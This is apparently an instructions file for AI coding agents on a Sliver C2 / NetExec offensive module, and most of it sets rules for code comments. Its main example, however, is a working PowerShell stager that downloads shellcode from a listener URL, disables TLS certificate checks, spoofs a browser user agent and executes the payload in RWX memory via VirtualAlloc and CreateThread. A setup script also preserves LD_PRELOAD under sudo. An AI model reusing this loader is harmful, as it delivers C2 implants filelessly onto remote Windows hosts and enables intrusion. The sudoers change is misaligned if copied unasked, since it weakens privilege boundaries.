# Agent Guidelines for Sliver NetExec Module

## Code Documentation Requirements

### MANDATORY: Always Add Comments

**ALL code changes must include comments.**

### Comment Style Guidelines

1. **Document Current State, Not Changes**
   - ✅ GOOD: Explain what the code does and why
   - ❌ BAD: Explain what changed from previous version ("Old approach → New approach")
   - **Rationale**: Change history belongs in git/chat, not in code comments

2. **What to Comment**
   - Complex algorithms
   - Non-obvious logic
   - Security-related decisions
   - Performance optimizations
   - Regex patterns
   - Mathematical formulas
   - Workarounds for bugs/limitations
   - Configuration values
   - Business logic

3. **Comment Format Examples**

   **BAD (Change-focused):**
   ```python
   # Old: Used 17MB shellcode directly → failed WinRM limit
   # New: Use 2KB bootstrap that downloads from listener
   def generate_bootstrap():
       ...
   ```

   **GOOD (Current state):**
   ```python
   def generate_bootstrap(stage_url):
       """Generate tiny PowerShell bootstrap (~2KB) that downloads shellcode from stager listener.
       
       This bootstrap:
           1. Downloads full shellcode (~17MB) from the stager URL via HTTP
           2. Allocates memory with VirtualAlloc (RWX permissions)
           3. Executes shellcode in-memory with CreateThread
       
       The small payload size (~2KB) ensures compatibility with WinRM's 150KB envelope limit.
       
       Args:
           stage_url: HTTP URL where shellcode is hosted (e.g., http://10.0.0.1:8080/stage2_abc123)
       
       Returns:
           PowerShell script as string
       """
       # Configure TLS 1.2 for compatibility with older Windows versions
       download_ps = f'''
       [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
       
       # Disable progress bar to reduce output noise
       $ProgressPreference = 'SilentlyContinue';
       
       # Accept all SSL certificates (required for self-signed certs in C2)
       [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
       
       # Download shellcode from stager listener
       $wc = New-Object System.Net.WebClient;
       $wc.Headers.Add('User-Agent', 'Mozilla/5.0');  # Mimic browser traffic
       $bytes = $wc.DownloadData('{stage_url}');
       $wc.Dispose();
       
       # Allocate RWX memory for shellcode execution
       # 0x1000 = MEM_COMMIT, 0x2000 = MEM_RESERVE, 0x40 = PAGE_EXECUTE_READWRITE
       Add-Type -TypeDefinition @"
       using System;
       using System.Runtime.InteropServices;
       public class Mem {{
           [DllImport("kernel32.dll")]
           public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
           [DllImport("kernel32.dll")]
           public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr start, IntPtr p, uint c, IntPtr id);
       }}
       "@;
       
       $addr = [Mem]::VirtualAlloc(0, $bytes.Length, (0x1000 -bor 0x2000), 0x40);
       [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length);
       [Mem]::CreateThread(0, 0, $addr, 0, 0, 0);
       '''
       return download_ps
   ```

4. **Docstring Requirements**
   - All public functions/methods must have docstrings
   - Include Args, Returns, Raises sections
   - Explain the "why" not just the "what"
   - Document assumptions and constraints
   - Note any security implications

5. **Inline Comments**
   - Explain non-obvious decisions
   - Clarify complex expressions
   - Document magic numbers/constants
   - Explain workarounds

### Testing Comments

Test docstrings must explain:
- What is being tested
- Why this test exists (what regression it prevents)
- What the expected behavior is

**Example:**
```python
def test_bootstrap_payload_under_150kb_limit(self):
    """Verify bootstrap stager stays under WinRM's 150KB envelope limit.
    
    This test ensures the fileless staging mode uses a tiny bootstrap (~2-3KB)
    instead of sending the full shellcode directly. WinRM has a 150KB message
    limit, so payloads must be small.
    
    The test simulates the full encoding chain:
        1. PowerShell script (UTF-8)
        2. UTF-16LE encoding (for -EncodedCommand)
        3. Base64 encoding
        4. WMI wrapper overhead
    """
    # Create realistic bootstrap script matching production implementation
    bootstrap_script = '''...'''
    
    # Simulate the encoding chain used by WinRMHandler.stage_execute()
    encoded = base64.b64encode(bootstrap_script.encode('utf-16-le')).decode('ascii')
    
    # Verify payload is well under 150KB limit (153,600 bytes)
    assert len(encoded) < 150 * 1024
```

### Configuration File Comments

Shell scripts, Dockerfiles, and config files need comments:

**Example:**
```bash
#!/bin/bash
set -e

# Install proxychains for SOCKS proxy support in NetExec
sudo apt-get install -y proxychains4

# Configure proxychains with SOCKS5 on localhost:1080
# This is the standard Tor/SSH tunnel port
sudo tee /etc/proxychains4.conf > /dev/null <<'EOF'
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
EOF

# Allow proxychains to work with sudo by preserving LD_PRELOAD
# Without this, the proxychains library won't be loaded in sudo context
sudo tee /etc/sudoers.d/proxychains > /dev/null <<EOF
Defaults env_keep += "LD_PRELOAD"
EOF
```

## Editing Existing Code

### CRITICAL: Preserve Existing Comments

**When editing existing code, NEVER remove existing comments unless explicitly requested.**

**Rules:**
1. **ALWAYS preserve existing comments** when making edits
2. **Update comments** if the code change makes them inaccurate
3. **Add new comments** for new code sections
4. **Only remove comments** if user explicitly asks to remove them

**Why this matters:**
- Existing comments represent knowledge that may not be obvious from context
- Removing comments loses institutional knowledge
- Comments help understand why code was written a certain way
- Future maintainers depend on comment history

**Example - WRONG:**
```bash
# Before edit (existing code):
# No arguments - do full install workflow
check_dependencies()

# After edit (you REMOVED the comment):
check_dependencies()
cleanup_existing()
```

**Example - CORRECT:**
```bash
# Before edit (existing code):
# No arguments - do full install workflow
check_dependencies()

# After edit (you PRESERVED the comment):
# No arguments - do full install workflow
check_dependencies()
cleanup_existing()
```

## Summary

- **ALWAYS add comments** - This is the most important rule
- **ALWAYS preserve existing comments** - Never remove comments that already exist
- **Document current state** - Not what changed from before
- **Explain why, not just what** - Help future developers understand decisions
- **Be thorough** - Err on the side of too many comments rather than too few
- **Comment intent** - Make the code's purpose crystal clear

The goal is that someone reading the code 6 months from now can understand:
1. What the code does
2. Why it does it that way
3. What assumptions it makes
4. What constraints it operates under

**Remember: Comments are not optional. They are a requirement.**
